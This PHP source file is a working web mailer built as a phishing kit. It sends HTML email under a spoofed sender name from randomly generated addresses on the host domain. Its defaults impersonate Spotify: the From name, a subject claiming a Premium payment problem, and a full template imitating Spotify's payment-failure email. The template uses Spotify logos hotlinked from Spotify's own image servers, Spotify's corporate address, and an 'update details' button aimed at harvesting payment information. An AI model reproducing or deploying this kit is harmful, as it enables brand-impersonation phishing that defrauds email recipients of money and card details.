<?php
// Auto-Detect Domain Email Sender
session_start();

// Automatically detect the domain
$domain = $_SERVER['HTTP_HOST'];
// Remove 'www.' if present
$domain = str_replace('www.', '', $domain);

// Function to generate unique from email
function generateFromEmail($domain) {
    $random = substr(md5(uniqid(rand(), true)), 0, 8);
    return "email_" . date('His') . "_" . $random . "@" . $domain;
}

// Function to send email
function sendEmail($fromEmail, $fromName, $to, $subject, $htmlContent) {
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=utf-8\r\n";
    $headers .= "From: " . $fromName . " <" . $fromEmail . ">\r\n";
    $headers .= "Reply-To: " . $fromEmail . "\r\n";
    
    return mail($to, $subject, $htmlContent, $headers);
}

// Process form submission
$message = "";
$messageType = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $fromName = $_POST['from_name'];
    $to = $_POST['to_email'];
    $subject = $_POST['subject'];
    $htmlContent = $_POST['html_content'];
    
    // Replace {email} with actual recipient email
    $htmlContent = str_replace('{email}', $to, $htmlContent);
    
    // Generate unique from email
    $fromEmail = generateFromEmail($domain);
    
    // Send email
    if (sendEmail($fromEmail, $fromName, $to, $subject, $htmlContent)) {
        $message = "Email sent successfully! From: " . $fromEmail;
        $messageType = "success";
    } else {
        $message = "Failed to send email. Please check your server configuration.";
        $messageType = "error";
    }
}

// Default HTML content with {email} placeholder
$defaultHtmlContent = '<tr>
  <td>
    <div id="main">
      <table style="background-color:#ffffff;text-align:left;width:100%;height:50px" class="header-root">
        <tbody>
          <tr>
            <td style="padding:24px">
              <a target="_blank" style="text-decoration:none;color:#1ed760" href="#">
                <img src="https://message-editor.scdn.co/newsletters/b220713a2d4ac7a75ebe1f9ee0c78549.png" height="37" style="display:block;max-width:100%;margin-right:auto;width:122px;height:auto" class="logo" alt="">
              </a>
            </td>
          </tr>
        </tbody>
      </table>

      <table style="width:100%;background-color:#ffffff">
        <tbody>
          <tr>
            <td style="padding:24px">
              <p style="background-color:#ffffff;color:#000000;font-family:spotifymixuititle,&quot;helvetica&quot;,&quot;arial&quot;, sans-serif;font-size:28px;margin:0;text-align:left">
                We still can\'t process your payment.
              </p>
            </td>
          </tr>
        </tbody>
      </table>

      <table style="width:100%;background-color:#ffffff">
        <tbody>
          <tr>
            <td style="padding:8px 24px 24px 24px">
              <p style="background-color:#ffffff;color:#000000;font-size:16px;margin:0;text-align:left">
                Your <b>Spotify Premium</b> payment method isn\'t working and we couldn\'t collect your payment.
                This could be because:<br><br>
              </p>
              <ul>
                <li>There\'s a problem with your bank</li>
                <li>Your payment card is expired</li>
                <li>There is not enough money in your account</li>
              </ul>
              <p>You\'ll lose your Spotify Premium if we don\'t have a working payment method for your account. We\'ll try your payment again over the next few days.</p>
            </td>
          </tr>
        </tbody>
      </table>

      <table style="width:100%;background-color:#ffffff;text-align:center" class="call-to-action-root">
        <tbody>
          <tr>
            <td style="padding:24px">
              <a target="_blank" style="text-decoration:none;color:#ffffff;margin-left:auto;margin-right:auto;max-width:240px;background-color:#1db954;border-radius:24px;display:block" class="call-to-action-button" href="#">
                <table style="width:100%;max-width:240px;min-height:48px">
                  <tbody>
                    <tr>
                      <td style="width:24px"></td>
                      <td style="font-weight:700;line-height:1.1em;letter-spacing:0.15px;font-size:14px;text-decoration:none;text-align:center;text-transform:uppercase;color:#ffffff">
                        update details
                      </td>
                      <td style="width:24px"></td>
                    </tr>
                  </tbody>
                </table>
              </a>
            </td>
          </tr>
        </tbody>
      </table>

      <table dir="auto" class="footer-root" style="background-color:#f7f7f7;width:100%">
        <tbody>
          <tr>
            <td colspan="3" style="height:25px;padding:6.25px"></td>
          </tr>
          <tr>
            <td style="width:6.25%"></td>
            <td>
              <img src="https://message-editor.scdn.co/newsletter/images/logo_footer.png" style="display:block;max-width:100%;height:23px" height="23" alt="Spotify Logo">
            </td>
            <td style="width:6.25%"></td>
          </tr>
          <tr>
            <td style="width:6.25%"></td>
            <td style="font-weight:400;line-height:1.65em;letter-spacing:0.15px;font-size:11px;color:#88898c">
              <span>This message was sent to <a href="mailto:{email}" class="mailto-link" target="_blank">{email}</a>.</span>
              If you have questions or complaints, please <a target="_blank" style="color:#6d6d6d;font-weight:bold;" href="#">contact us</a>.
            </td>
            <td style="width:6.25%"></td>
          </tr>
          <tr>
            <td style="width:6.25%"></td>
            <td style="font-weight:400;line-height:1.65em;letter-spacing:0.15px;font-size:11px;color:#88898c">
              Spotify USA Inc, 4 World Trade Center, 150 Greenwich Street, 62nd Floor, New York, NY 10007, USA
            </td>
            <td style="width:6.25%"></td>
          </tr>
        </tbody>
      </table>
    </div>
  </td>
</tr>';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Sender</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
        .container { background: #ffffff; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        textarea { height: 200px; font-family: monospace; }
        #html_content { height: 400px; }
        button { background: #1db954; color: white; padding: 14px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #1ed760; }
        .message { padding: 15px; border-radius: 5px; margin: 15px 0; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; margin-bottom: 20px; padding: 15px; border-radius: 5px; }
        .preview { background: #f9f9f9; padding: 15px; border: 1px dashed #ccc; border-radius: 5px; margin-top: 10px; }
        .tabs { display: flex; margin-bottom: 10px; }
        .tab { padding: 10px 15px; background: #eee; cursor: pointer; margin-right: 5px; border-radius: 5px 5px 0 0; }
        .tab.active { background: #1db954; color: white; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Email Sender</h1>
        
        <div class="info">
            <strong>Domain Detected:</strong> <?php echo $domain; ?><br>
            <strong>How it works:</strong> Each time you send, a new unique email address will be generated using your domain.
            <strong>Note:</strong> The {email} placeholder in your HTML will be automatically replaced with the recipient's email.
        </div>

        <?php if ($message): ?>
            <div class="message <?php echo $messageType; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <form method="POST">
            <div class="form-group">
                <label for="from_name">From Name:</label>
                <input type="text" id="from_name" name="from_name" value="<?php echo isset($_POST['from_name']) ? htmlspecialchars($_POST['from_name']) : 'Spotify'; ?>" required>
            </div>

            <div class="form-group">
                <label for="to_email">To Email:</label>
                <input type="email" id="to_email" name="to_email" value="<?php echo isset($_POST['to_email']) ? htmlspecialchars($_POST['to_email']) : ''; ?>" required>
            </div>

            <div class="form-group">
                <label for="subject">Subject:</label>
                <input type="text" id="subject" name="subject" value="<?php echo isset($_POST['subject']) ? htmlspecialchars($_POST['subject']) : 'Payment Issue with Your Spotify Premium'; ?>" required>
            </div>

            <div class="form-group">
                <label for="html_content">HTML Content:</label>
                <div class="tabs">
                    <div class="tab active" onclick="switchTab('default')">Default Template</div>
                    <div class="tab" onclick="switchTab('custom')">Custom HTML</div>
                </div>
                <textarea id="html_content" name="html_content" required><?php echo isset($_POST['html_content']) ? htmlspecialchars($_POST['html_content']) : $defaultHtmlContent; ?></textarea>
                <div class="preview">
                    <strong>Preview:</strong> The {email} placeholder will be replaced with: <span id="email-preview"><?php echo isset($_POST['to_email']) ? htmlspecialchars($_POST['to_email']) : 'recipient@example.com'; ?></span>
                </div>
            </div>

            <button type="submit">Send Email</button>
        </form>
    </div>

    <script>
        function switchTab(tabName) {
            // Update tab appearance
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.target.classList.add('active');
            
            // Set content based on tab
            const textarea = document.getElementById('html_content');
            if (tabName === 'default') {
                textarea.value = `<?php echo addslashes($defaultHtmlContent); ?>`;
            }
            // For custom tab, we keep whatever is already there
        }
        
        // Update email preview when recipient email changes
        document.getElementById('to_email').addEventListener('input', function() {
            document.getElementById('email-preview').textContent = this.value || 'recipient@example.com';
        });
    </script>
</body>
</html>